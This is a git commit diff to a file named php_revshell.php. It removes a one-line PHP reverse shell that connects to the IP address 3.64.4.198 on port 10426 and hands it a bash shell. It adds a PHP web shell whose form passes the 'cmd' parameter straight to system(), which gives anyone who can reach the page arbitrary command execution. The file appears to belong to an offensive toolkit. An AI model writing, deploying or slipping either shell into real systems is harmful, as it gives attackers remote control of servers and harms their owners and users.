17c6d38dc26fc487eedb4d5f57bdf3a8def73a62
toussoul <48627249+toussoul@users.noreply.github.com>
2023-08-03 23:42:48 +0200

    Update php_revshell.php

--- php_revshell.php
+++ php_revshell.php
@@ -1,1 +1,17 @@
-<?php $sock=fsockopen("3.64.4.198",10426);exec("/bin/bash <&3 >&3 2>&3"); ?>
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
